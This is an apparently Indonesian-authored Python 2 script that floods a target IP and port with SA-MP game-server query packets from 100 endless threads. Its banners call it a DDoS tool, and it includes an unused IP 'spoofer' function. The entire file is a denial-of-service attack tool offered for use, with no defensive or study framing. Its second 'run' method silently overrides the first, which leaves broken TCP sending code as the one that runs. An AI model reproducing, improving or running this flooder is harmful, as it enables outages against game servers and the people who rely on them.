import socket, struct, codecs, sys, threading, random, time, os
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip
Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

print ' DDOS KAH BANG? BELIIIN DULU NITROD BARU JALAN DENGAN 5 DETIK'
time.sleep(5)
print ' UDAH PUNYA IZIN BUAT DDOS?'
time.sleep(2)
print ' DDOS DI MULAI DECK DALAM 5 DETIK'
print ' Loading.'
time.sleep(1)
print ' Loading..'
time.sleep(1)
print ' Loading...'
time.sleep(1)
print ' Loading....'
time.sleep(1)
print ' Loading.....'
time.sleep(1)
os.system('clear')
print ' \033[91mDOR'
time.sleep(2)
os.system('clear')
print ' \033[32;1m___________________________________'
print ' \033[31;1mEXPERIENCE COMMUNITY'
print ' \033[31;1mEXPERIENCE MENYENGGOL'
print ' \033[31;1mIP PORT \033[30;1m%s:%s' % (orgip,port)
print ' \033[31;1mEASY KENDOSS DECK'
print ' \033[32;1m___________________________________'

class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Pacotes[random.randrange(0, 3)]
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            msg = Pacotes[random.randrange(0, 3)]
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))


if __name__ == '__main__':
    try:
        for x in range(100):
            mythread = MyThread()
            mythread.start()
            time.sleep(0.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print '************************'
        print '**   DDOS TOOLS EXP   **'
        print '************************'
        print '\n\n'
        print ('BERHENTI MENYERANG {}').format(orgip)
